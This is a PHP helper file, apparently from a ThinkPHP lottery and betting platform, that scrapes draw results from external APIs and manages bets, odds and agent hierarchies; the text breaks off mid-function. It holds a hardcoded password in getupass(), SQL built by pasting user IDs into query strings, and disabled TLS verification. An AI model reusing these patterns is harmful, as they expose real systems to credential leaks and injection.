<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------
use app\admin\model\LoginLon;
use Flyers\K28;
use think\Db;
use think\Cache;
// 应用公共文件

function formatqs($gid, $qs)
{
    if ($gid == 113 | $gid == 123)
        $qs = substr($qs, 0, 8) . substr($qs, -2);
    else if ($gid == 152 | $gid == 153 | $gid == 155)
        $qs = substr($qs, -9);
    else if ($gid == 121 | $gid == 125)
        $qs = substr($qs, 0, 8) . substr($qs, -2);
    return $qs;
}

function xy28kj($arr)
{
    $m = array();
    $ca = count($arr);
    $tmp = 0;
    for ($i = 0; $i < $ca; $i++) {
        $tmp += $arr[$i];
        if ($i == 5) {
            $m[]  = $tmp % 10;
            $tmp = 0;
        }
        if ($i == 11) {
            $m[]  = $tmp % 10;
            $tmp = 0;
        }
        if ($i == 17) {
            $m[]  = $tmp % 10;
            $tmp = 0;
        }
    }
    return $m;
}

function cjkj($gid, $qishu)
{
    $arr = array();
    switch ($gid) {
        case '109': //澳洲幸运5
            $url = 'https://api.api68.com/CQShiCai/getBaseCQShiCaiList.do?lotCode=10010';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            // 		foreach($data_ary as $datas ){
            // 			$term = $datas['preDrawIssue'];
            // 			$code = $datas['preDrawCode'];
            // 			$opentime = date('Y-m-d H:i:s',strtotime($datas['preDrawTime']));
            // 			$next_term = $term+1;
            // 			$next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime']) ) );
            // 			if($term == $qishu){
            // 				break;
            // 			}
            // 		}		
            $arr['m'] = $data_ary;
            // 		$arr['qishu'] = $term;
            break;
        case '131': //澳洲幸运8
            $url = 'https://api.api68.com/klsf/getHistoryLotteryInfo.do?date=&lotCode=10011';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            // 		foreach($data_ary as $datas ){
            // 			$term = $datas['preDrawIssue'];
            // 			$code = $datas['preDrawCode'];
            // 			$opentime = date('Y-m-d H:i:s',strtotime($datas['preDrawTime']));
            // 			$next_term = $term+1;
            // 			$next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime']) ) );
            // 			if($term == $qishu){
            // 				break;
            // 			}
            // 		}		
            $arr['m'] = $data_ary;
            // 		$arr['qishu'] = $term;
            break;
        case '132': //澳洲幸运8
            $url = 'https://api.api68.com/klsf/getLotteryInfo.do?date=&lotCode=10011';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            // 		foreach($data_ary as $datas ){
            // 			$term = $datas['preDrawIssue'];
            // 			$code = $datas['preDrawCode'];
            // 			$opentime = date('Y-m-d H:i:s',strtotime($datas['preDrawTime']));
            // 			$next_term = $term+1;
            // 			$next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime']) ) );
            // 			if($term == $qishu){
            // 				break;
            // 			}
            // 		}		
            $arr['m'] = $data_ary;
            // 		$arr['qishu'] = $term;
            break;
        case '1755': //澳洲幸运10
            //$url = 'http://api.168308.com/application/api/HistoryCenter.php?lotCode=10049';
            $url = 'https://www.1680590.com/api/pks/getPksHistoryList.do?lotCode=10012';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '177': //SG飞艇
            $url = 'https://www.1680590.com/api/pks/getPksHistoryList.do?lotCode=10058';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '163': //PC蛋蛋幸运28
            $url = 'https://www.1681090.com/api/LuckTwenty/getPcLucky28List.do?date=&lotCode=10074';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);
            $json = json_decode($data, 1);

            $data_ary = $json['result']['data'];

            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '170': //极速FT
            $url = 'https://www.1680590.com/api/pks/getPksHistoryList.do?lotCode=10035';

            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);

            $json = json_decode($data, 1);


            $data_ary = $json['result']['data'];
            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '172': //极速pk
            $url = 'https://www.1680590.com/api/pks/getPksHistoryList.do?lotCode=10037';

            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);

            $json = json_decode($data, 1);


            $data_ary = $json['result']['data'];
            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '108': //极速ssc
            $url = 'https://api.api68.com/CQShiCai/getBaseCQShiCaiList.do?lotCode=10036';
            // $url ='http://1680610.com/api/CQShiCai/getBaseCQShiCai.do?lotCode=10036';
            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);

            $json = json_decode($data, 1);


            $data_ary = $json['result']['data'];
            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
        case '171': //xyft
            $url = 'https://www.1680590.com/api/pks/getPksHistoryList.do?lotCode=10057';

            //error_log("=url=$url\n",3,"sw.lg");

            $data = curlPost($url, array(), 10, false);

            $json = json_decode($data, 1);


            $data_ary = $json['result']['data'];
            foreach ($data_ary as $datas) {
                $term = $datas['preDrawIssue'];
                $code = $datas['preDrawCode'];
                $opentime = date('Y-m-d H:i:s', strtotime($datas['preDrawTime']));
                $next_term = $term + 1;
                $next_time =  date('Y-m-d H:i:s', strtotime("+5 minute", strtotime($datas['preDrawTime'])));
                if ($term == $qishu) {
                    break;
                }
            }
            $arr['m'] = $code;
            $arr['qishu'] = $term;
            break;
    }
    return json_encode($arr);
}

function curlPost($url, $data = array(), $timeout = 30, $CA = true)
{
    $origin = $url; //目标网址

    //注意了，这里的hear信息比较关键， 请先用ajax测试访问成功，然后把请求信息复制过来替换
    $header = [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: zh-CN,zh;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: ' . $origin,
        'Referer:' . $origin,
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
        'X-Requested-With: XMLHttpRequest',
        'Accept-Encoding: gzip'
    ];
    // 初始化一个curl会话
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $origin);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); //解决重定向问题

    // 执行一个curl会话
    $contents = curl_exec($ch);
    // 执行cURL请求
    $response = curl_exec($ch);

    // 检查错误
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    } else {
        // 对gzip压缩的响应进行解压
        $decoded_response = gzdecode($response);
        if ($decoded_response === false) {
            echo "Failed to decompress the response.";
        } else {
            return $decoded_response;
        }
    }

    // 关闭cURL句柄
    curl_close($ch);
}

function getbrowser($os)
{
    if (!empty($os)) {
        $br = $os;
        if (preg_match('/MSIE/i', $br)) {
            $br = 'MSIE';
        } elseif (preg_match('/Firefox/i', $br)) {
            $br = 'Firefox';
        } elseif (preg_match('/Chrome/i', $br)) {
            $br = 'Chrome';
        } elseif (preg_match('/Safari/i', $br)) {
            $br = 'Safari';
        } elseif (preg_match('/Opera/i', $br)) {
            $br = 'Opera';
        } else {
            $br = 'Other';
        }
        return $br;
    } else {
        return "unknow";
    }
}

function getos($os)
{
    if (!empty($os)) {
        $OS = $os;
        if (preg_match('/win/i', $OS)) {
            $OS = 'Windows';
        } elseif (preg_match('/mac/i', $OS)) {
            $OS = 'MAC';
        } elseif (preg_match('/linux/i', $OS)) {
            $OS = 'Linux';
        } elseif (preg_match('/unix/i', $OS)) {
            $OS = 'Unix';
        } elseif (preg_match('/bsd/i', $OS)) {
            $OS = 'BSD';
        } else {
            $OS = 'Other';
        }
        return $OS;
    } else {
        return "unknow";
    }
}

function p0($v)
{
    return round($v, 0);
}
function p1($v)
{
    return round($v, 1);
}
function p2($v)
{
    return round($v, 2);
}
function p3($v)
{
    return round($v, 3);
}
function pr2($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 2);
}
function pr3($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 3);
}
function pr4($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 4);
}
function pr1($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 1);
}
function pr0($v)
{
    if ($v == 'null')
        return 0;
    else
        return round($v, 0);
}

function getupass()
{
    return 'puhh8kik';
}

function userchange($action, $uid, $ip = '')
{
    if ($ip == '' | $ip == null) $ip = request()->ip();
    if ($uid == 99999999) {
        db('user_edit')->where(['modiip' => $ip, 'moditime' => Db::raw('now()'), 'action' => $action, 'userid' => $uid, 'modiuser' => $uid, 'modisonuser' => $uid]);
    } else {
        db('user_edit')->where(['modiip' => $ip, 'moditime' => Db::raw('now()'), 'action' => $action, 'userid' => $uid, 'modiuser' => $uid, 'modisonuser' => 0]);
    }
    return true;
}

function wfuser($game, $item)
{
    $g = $game['fenlei'];
    $b = transb8('name', $item['bid'], $item['gid']);
    $s = transs8('name', $item['sid'], $item['gid']);
    $c = transc8('name', $item['cid'], $item['gid']);
    $p = transp8('name', $item['pid'], $item['gid']);
    $p = "" . $p . "";
    if ($b == "番摊") {
        return $c . ' ' . $p;
    } else if ($g == 100 || $g == 200) {
        if ($s == '過關') {
            return $p;
        } else if ($b == '生肖連' || $b == '尾數連') {
            return  $p;
        } else {
            return $s . ' ' . $p;
        }
    } else if (($g == 101 | $g == 163) && $s != '番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s . ' ' . $p;
                break;
            case "1字组合":
                return $c . ' ' . $p;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "2字和数":
                return $s . ' ' . $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "组选3":
                return $p;
                break;
            case "组选6":
                return $p;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c . ' ' . $p;
                break;
            case "前中后三":
            case "前三":
                return $s . ' ' . $p;
                break;
        }
    } else {
        if ($s == '冠亚和') {
            return $s . ' ' . $p;
        } else {
            return $b . ' ' . $p;
        }
    }
}
function wfuser2($g, $b, $s, $c, $p)
{
    $p = "" . $p . "";
    if ($b == "番摊") {
        return $c . ' ' . $p;
    } else if ($g == 100 || $g == 200) {
        if ($s == '過關') {
            return $p;
        } else if ($b == '生肖連' || $b == '尾數連') {
            return  $p;
        } else {
            return $s . ' ' . $p;
        }
    } else if (($g == 101 | $g == 163) && $s != '番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s . ' ' . $p;
                break;
            case "1字组合":
                return $c . ' ' . $p;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "2字和数":
                return $s . ' ' . $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . ' ' . $c . ' ' . $p;
                else
                    return $s . ' ' . $p;
                break;
            case "组选3":
                return $p;
                break;
            case "组选6":
                return $p;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c . ' ' . $p;
                break;
            case "前中后三":
            case "前三":
                return $s . ' ' . $p;
                break;
        }
    } else {
        if ($s == '冠亚和') {
            return $s . ' ' . $p;
        } else {
            return $b . ' ' . $p;
        }
    }
}

function transb8($field, $bid, $gid)
{
    $bclass = db('bclass')->where('gid', $gid)->where('bid', $bid)->field($field)->find();
    return $bclass[$field];
}
function transs8($field, $sid, $gid)
{
    $bclass = db('sclass')->where('gid', $gid)->where('sid', $sid)->field($field)->find();
    return $bclass[$field];
}
function transc8($field, $cid, $gid)
{
    $bclass = db('class')->where('gid', $gid)->where('cid', $cid)->field($field)->find();
    return $bclass[$field];
}
function transp8($field, $pid, $gid)
{
    $bclass = db('play')->where('gid', $gid)->where('pid', $pid)->field($field)->find();
    return $bclass[$field];
}
function transb($field, $bid)
{
    $bclass = db('bclass')->where('gid', session('gid'))->where('bid', $bid)->field($field)->find();
    return $bclass[$field];
}
function transs($field, $sid)
{
    $sclass = db('sclass')->where('gid', session('gid'))->where('sid', $sid)->field($field)->find();
    return $sclass[$field];
}
function transc($field, $cid)
{
    $class = db('class')->where('gid', session('gid'))->where('cid', $cid)->field($field)->find();
    return $class[$field];
}
function transp($field, $pid)
{
    $play = db('play')->where('gid', session('gid'))->where('pid', $pid)->field($field)->find();
    return $play[$field];
}
function getwarn($class)
{
    $warn = db('warn')->where('userid', CHECK_ID)->where('gid', session('gid'))->where('class', $class)->find();
    return array(
        "je" => $warn['je'],
        "ks" => $warn['ks']
    );
}
function getuserpeilvcha($uid, $class)
{
    $peilv = 0;
    while ($uid != 99999999) {
        $zpan = db('zpan')->where('userid', $uid)->where('gid', session('gid'))->where('class', $class)->find();
        $peilv += $zpan['peilvcha'];
        $user = db('user')->where('userid', $uid)->find();
        $uid = $user['fid'];
        if ($uid == 99999999)
            break;
    }
    return $peilv;
}

function getgamecs($uid)
{
    $game = db('gamecs')->where('userid', $uid)->where('ifok', 1)->order('xsort')->select();
    $gamecs = [];
    foreach ($game as $i => $item) {
        $gamecs[$i]['ifok']    = $item['ifok'];
        $gamecs[$i]['flytype'] = $item['flytype'];
        $gamecs[$i]['flyzc']   = $item['flyzc'];
        $gamecs[$i]['zc']      = $item['zc'];
        $gamecs[$i]['upzc']    = $item['upzc'];
        $gamecs[$i]['zcmin']  = $item['zcmin'];
        $gamecs[$i]['gid']     = $item['gid'];
        $gamecs[$i]['xsort']     = $item['xsort'];
    }
    return $gamecs;
}
function getgamezc($uid)
{
    global $tb_gamezc, $psql;
    $psql->query("select * from `$tb_gamezc` where userid='$uid' order by typeid");
    $i = 0;
    while ($psql->next_record()) {
        $gamezc[$i]['flyzc']   = $psql->f('flyzc');
        $gamezc[$i]['zc']      = $psql->f('zc');
        $gamezc[$i]['upzc']    = $psql->f('upzc');
        $gamezc[$i]['zcmin']  = $psql->f('zcmin');
        $gamezc[$i]['flytype']     = $psql->f('flytype');
        $gamezc[$i]['typeid']     = $psql->f('typeid');
        $gamezc[$i]['typename']     = $psql->f('typename');
        $i++;
    }
    return $gamezc;
}
function getgame()
{
    $game = db('game')->order('xsort')->select();
    foreach ($game as $i => $item) {
        $game[$i]['gid']            = $item['gid'];
        $game[$i]['gname']          = $item['gname'];
        $game[$i]['fast']           = $item['fast'];
        $game[$i]['mnum']           = $item['mnum'];
        $game[$i]['fenlei']           = $item['fenlei'];
        $game[$i]['xsort']           = $item['xsort'];
        $game[$i]['panstatus']      = $item['panstatus'];
        $game[$i]['otherstatus']    = $item['otherstatus'];
        $game[$i]['otherclosetime'] = $item['otherclosetime'];
        $game[$i]['userclosetime']  = $item['userclosetime'];
        $game[$i]['ifopen']           = $item['ifopen'];
        $game[$i]['autokj']           = $item['autokj'];
        $game[$i]['guanfang']           = $item['guanfang'];
        $game[$i]['io']           = 1;
    }
    return $game;
}
function getfluser($uid)
{
    global $tb_gamecs, $tb_game, $psql;
    $psql->query("select fenlei,flname from `$tb_game` where gid in(select gid from `$tb_gamecs` where userid='$uid' and ifok=1) group by fenlei order by xsort");
    $i = 0;
    while ($psql->next_record()) {
        $fl[$i]['fenlei']    = $psql->f('fenlei');
        $fl[$i]['flname']    = $psql->f('flname');
        $i++;
    }
    return $fl;
}
function getgamename($game)
{
    $cg = count($game);
    for ($i = 0; $i < $cg; $i++) {
        $gameInfo = db('game')->where('gid', $game[$i]['gid'])->find();
        $game[$i]['gname']  = $gameInfo['gname'];
        $game[$i]['sgname'] = $gameInfo['sgname'];
        $game[$i]['fenlei'] = $gameInfo['fenlei'];
        $game[$i]['flname'] = $gameInfo['flname'];
        $game[$i]['fast']   = $gameInfo['fast'];
        $game[$i]['class']  = $gameInfo['class'];
    }
    return $game;
}
function getweb()
{
    $webList = db('web')->order('wid')->select();
    foreach ($webList as $i => $value) {
        $layer[$i]['wid']      = $value['wid'];
        $layer[$i]['layer']    = json_decode($value['layer'], true);
        $namehead              = json_decode($value['namehead'], true);
        $layer[$i]['namehead'] = $namehead[0];
    }
    return $layer;
}
function transutype($ifagent)
{
    if ($ifagent == 1) {
        return "运营";
    } else {
        return "会员";
    }
}
function getmaxmoney($uid)
{
    $tb_user = 'x_user';
    $maxmoney = 1000000000;
    if ($uid == 99999999) {
        $sum = Db::query("select sum(maxmoney) from `$tb_user` where fid='$uid'");
        return $maxmoney - $sum[0]['sum(maxmoney)'];
    }
    $user = Db::query("select maxmoney from `$tb_user` where userid='$uid'");
    $usermaxmoney = $user[0]['maxmoney'];
    $sum = Db::query("select sum(maxmoney) from `$tb_user` where fid='$uid'");
    if ($sum) {
        return $usermaxmoney - $sum[0]['sum(maxmoney)'];
    }
}
function getkmaxmoney($uid)
{
    $tb_user = 'x_user';
    $maxmoney = 1000000000;
    if ($uid == 99999999) {
        $sum = Db::query("select sum(kmaxmoney) from `$tb_user` where fid='$uid'");
        return $maxmoney - $sum[0]['sum(kmaxmoney)'];
    }
    $user = Db::query("select kmaxmoney from `$tb_user` where userid='$uid'");
    $usermaxmoney = $user[0]['kmaxmoney'];
    $sum = Db::query("select sum(kmaxmoney) from `$tb_user` where fid='$uid'");
    if ($sum) {
        return $usermaxmoney - $sum[0]['sum(kmaxmoney)'];
    }
}
function transstatus($v)
{
    if ($v == 1) {
        $v = '启用';
    } else if ($v == 2) {
        $v = '冻结';
    } else {
        $v = '停用';
    }
    return $v;
}
function getfids($uid, $melayer)
{
    $layer = transuser($uid, 'layer');
    $u     = array();
    $user = Db::query("select fid1,fid2,fid3,fid4,fid5,fid6,fid7,fid8 from `x_user` where userid='$uid'");
    for ($i = $layer - 1; $i > $melayer; $i--) {
        $u[$i] = $user[0]['fid' . $i];
    }
    return $u;
}
function getfid($uid)
{
    $layer = transuser($uid, 'layer');
    $u     = array();
    $user = Db::query("select fid1,fid2,fid3,fid4,fid5,fid6,fid7,fid8 from `x_user` where userid='$uid'");
    for ($i = $layer - 1; $i > 0; $i--) {
        $u[$i] = $user[0]['fid' . $i];
    }
    return $u;
}
function checkid($v)
{
    if (strlen($v) != 8 | $v % 1 != 0 | !is_numeric($v)) return false;
    return true;
}
function getzcnewall($uid, $f, $layer, $zcmode)
{
    global $tb_user, $tsql, $psql;
    $zc     = array();
    if ($zcmode == 1) {
        $gamecs = getgamecs($uid);
    } else {
        $gamecs = getgamezc($uid);
    }
    $cg     = count($gamecs);
    for ($i = 0; $i < $cg; $i++) {
        $zc[$layer][$i]['upzc'] = $gamecs[$i]['upzc'];
        $zc[$layer][$i]['ifok'] = $gamecs[$i]['ifok'];
    }
    $cf = count($f);
    for ($i = $cf; $i > 0; $i--) {
        if ($zcmode == 1) {
            $gamecs = getgamecs($f[$i]);
        } else {
            $gamecs = getgamezc($f[$i]);
        }
        for ($j = 0; $j < $cg; $j++) {
            $totalzc = 0;
            for ($k = $layer - 1; $k >= $i; $k--) {
                $totalzc += $zc[$k][$j]['zc'];
            }
            if ($zc[$i + 1][$j]['upzc'] < $gamecs[$j]['zcmin']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zcmin'];
            } else {
                $zc[$i][$j]['zc'] = $zc[$i + 1][$j]['upzc'];
            }
            if ($zc[$i][$j]['zc'] + $totalzc > $gamecs[$j]['zc']) {
                $zc[$i][$j]['zc'] = $gamecs[$j]['zc'] - $totalzc;
            }
            $zc[$i][$j]['upzc'] = $gamecs[$j]['upzc'];
            if ($zcmode == 1) {
                $zc[$i][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
            } else {
                $zc[$i][$j]['name'] = $gamecs[$j]['typename'];
            }
            $zc[$i][$j]['ifok'] = $zc[$i + 1][$j]['ifok'];
        }
    }

    for ($j = 0; $j < $cg; $j++) {
        $totalzc = 0;
        for ($k = $layer - 1; $k >= 1; $k--) {
            $totalzc += $zc[$k][$j]['zc'];
        }
        $zc[0][$j]['zc']   = 100 - $totalzc;
        if ($zcmode == 1) {
            $zc[0][$j]['name'] = transgame($gamecs[$j]['gid'], 'gname');
        } else {
            $zc[$i][$j]['name'] = $gamecs[$j]['typename'];
        }
        $zc[0][$j]['ifok'] = $zc[1][$j]['ifok'];
    }
    unset($zc[$layer]);
    return $zc;
}
function isnum($v)
{
    if (!is_numeric($v) | $v == '' | $v % 1 != 0)
        return 0;
    return $v;
}
function r0($v)
{
    if ($v == '')
        return 0;
    else
        return $v;
}
function r1($v)
{
    if ($v == '')
        return 1;
    else
        return $v;
}
function setupid($tb, $field)
{
    $res = db('user')->where($field, '<>', '99999999')->max($field);
    if (!$res) {
        $config = db('config')->find();
        return $config['startid'] + rand(1, 3);
    }
    return $res + rand(1, 3);
}
function getjes8($class, $uid, $gid)
{
    $arr = [];
    $points = db('points')->where('userid', $uid)->where('gid', $gid)->where('class', $class)->find();
    $arr['cmaxje'] = pr0($points['cmaxje']);
    $arr['maxje'] = pr0($points['maxje']);
    $arr['minje'] = pr0($points['minje']);
    return $arr;
}

function create_invite_code($len = 16)
{
    $d = '';
    for (
        $s = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZasdfghjklzxcvbnmqwertyuiop',
        $f = 0;
        $f < $len;
        $d .= $s[rand(0, strlen($s) - 1)],
        $f++
    );
    return $d;
}
//地址生成
function getUserurl($tar, $code)
{
    return session('rbDomain') . '/chat/index/' . $tar . '=' . $code;
}

function share($id, $val)
{
    vendor('phpqrcode.phpqrcode');
    $path = ROOT_PATH . 'public' . DS . 'qr' . DS . $val . '.png';
    $img = DS . 'qr' . DS . $val . '.png';
    if (!file_exists($path)) {
        $errorCorrectionLevel = "Q"; // 容错级别：L、M、Q、H
        $matrixPointSize = "8"; // 点的大小：1到10
        $qr = new \QRcode();
        $val = session('rbDomain') . '/chat/index/index?cd=' . $val;
        ob_start();
        $qr->png($val, $path, $errorCorrectionLevel, $matrixPointSize, 2);
        ob_end_clean();
    }
    return $img;
}

function unicode_decode($num)
{
    $b = '';
    for ($i = 0; $i < $num; $i++) {
        // 使用chr()函数拼接双字节汉字，前一个chr()为高位字节，后一个为低位字节
        $a = chr(mt_rand(0xB0, 0xD0)) . chr(mt_rand(0xA1, 0xF0));
        // 转码
        $b .= iconv('GB2312', 'UTF-8', $a);
    }
    return $b;
}

function rand_str($n)
{
    $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $len = strlen($str) - 1;
    $randstr = '';
    for ($i = 0; $i < $n; $i++) {
        $num = mt_rand(0, $len);
        $randstr .= $str[$num];
    }
    return $randstr;
}

function getData($val)
{
    $u = $val['dataUrl'];
    switch ($val['gameType']) {
        case '75':
            $wp = Db::name('rbwp')->where('id', 12)->find();
            $Sch = curl_init();
            curl_setopt($Sch, CURLOPT_POST, 1);
            curl_setopt($Sch, CURLOPT_URL, $wp['websiteUrl'] . 'comgame/getopencode');
            curl_setopt($Sch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($Sch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($Sch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($Sch, CURLOPT_TIMEOUT, 10);
            curl_setopt($Sch, CURLOPT_POSTFIELDS, http_build_query(['roomeng' => 'twbingo']));
            $headers = array(
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
            );
            curl_setopt($Sch, CURLOPT_HTTPHEADER, $headers);
            $file_content = curl_exec($Sch);
            curl_close($Sch);
            $body = json_decode($file_content, true);
            $body = json_decode($body['Msg'], true);
            if ($body['Opencode']) {
                $dateString = $body['Opentime'];
                $year = substr($dateString, 0, 4);
                $month = substr($dateString, 4, 2);
                $day = substr($dateString, 6, 2);
                $hour = substr($dateString, 8, 2);
                $minute = substr($dateString, 10, 2);
                $second = substr($dateString, 12, 2);
                $dateTimeString = "$year-$month-$day $hour:$minute:$second";
                $codeArr = explode(',', $body['Opencode']);
                $codeArr = array_slice($codeArr, 0, 5);
                $codeStr = implode(',', $codeArr);
                $body['preDrawIssue'] = $body['Expect'];
                $body['drawIssue'] = $body['Expect'] + 1;
                $body['drawTime'] = date('Y-m-d H:i:s', strtotime($dateTimeString) + 300);
                $body['preDrawCode'] = $codeStr;
                $arr = $body;
            } else {
                $arr = ['preDrawIssue' => ''];
            }
            break;
        case '28':
            $response = curl_get($u);
            $response = json_decode($response, true);
            $hasValidData = false;
            $response = $response ?? []; 
            foreach ($response as $item) {
                if (isset($item['forecast']) && count($item['forecast']) > 1) {
                    $hasValidData = true;
                    break;
                }
            }
            if ($hasValidData) {
                $firstItem = $response[0];  // 第一条数据
                $secondItem = $response[1]; // 第二条数据
                $arr['preDrawIssue'] = $secondItem['qishu'];
                $arr['drawIssue'] = $firstItem['qishu'];
                $arr['drawTime'] = date('Y-m-d') . ' ' . $firstItem['time'] . ':00';
                $arr['preDrawCode'] = $secondItem['kjcodes'];
            } else {
                $arr = ['preDrawIssue' => ''];
            }
            /*   $arr = $response['data'];
            if ($response['status'] == 0 && isset($arr['next_issue'])) {
                $codeArr = explode(',', $arr['draw_code']);
                $codeArr = array_slice($codeArr, 0, 3);
                $codeStr = implode(',', $codeArr);
                $arr['preDrawIssue'] = $arr['issue'];
                $arr['drawIssue'] = $arr['next_issue'];
                $arr['drawTime'] = $arr['next_time'];
                $arr['preDrawCode'] = $codeStr;
            } else {
                $arr = ['preDrawIssue' => ''];
            }*/

            break;
        case '717':
            $response = curl_get($u);
            $response = json_decode($response, true);
            $arr = $response['data'];
            if ($response['status'] == 0 && isset($arr['next_issue'])) {
                $codeArr = explode('|', $arr['draw_code']);
                $codeStr = $codeArr[0];
                $arr['preDrawIssue'] = $arr['issue'];
                $arr['drawIssue'] = $arr['next_issue'];
                $arr['drawTime'] = $arr['next_time'];
                $arr['preDrawCode'] = $codeStr;
            } else {
                $arr = ['preDrawIssue' => ''];
            }
            break;
        case '174':
            $response = curl_get($u);
            $response = json_decode($response, true);
